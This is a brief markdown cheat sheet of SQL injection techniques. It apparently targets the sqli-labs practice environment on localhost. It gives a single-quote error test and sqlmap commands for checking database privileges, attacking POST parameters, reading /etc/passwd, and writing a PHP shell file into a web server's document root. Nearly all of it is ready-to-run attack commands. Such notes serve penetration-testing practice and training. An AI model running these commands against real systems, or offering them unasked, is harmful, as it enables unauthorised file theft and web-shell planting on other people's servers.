# SQLI tricks

## GET

### Error-Based

### Simple test

`Adding a simpe quote '`

Example: `http://192.168.1.104/Less-1/?id=5'`

### Checking Privileges

Using Sql-map

`./sqlmap.py -u http://localhost/Less-1/?id=1 --privileges | grep FILE`

### Reading file

`./sqlmap.py -u <URL> --file-read=<file to read>`

`./sqlmap.py -u http://localhost/Less-1/?id=1 --file-read=/etc/passwd`

### Writing file

`./sqlmap.py -u <url> --file-write=<file> --file-dest=<path>`

`./sqlmap.py -u http://localhost/Less-1/?id=1 --file-write=shell.php --file-dest=/var/www/html/shell-php.php`

## POST

`./sqlmap.py -u <POST-URL> --data="<POST-paramters> "`

`./sqlmap.py -u http://localhost/Less-11/ --data "uname=teste&passwd=&submit=Submit" -p uname`

You can also use a file like with the post request:


`./sqlmap.py -r post-request.txt -p uname`




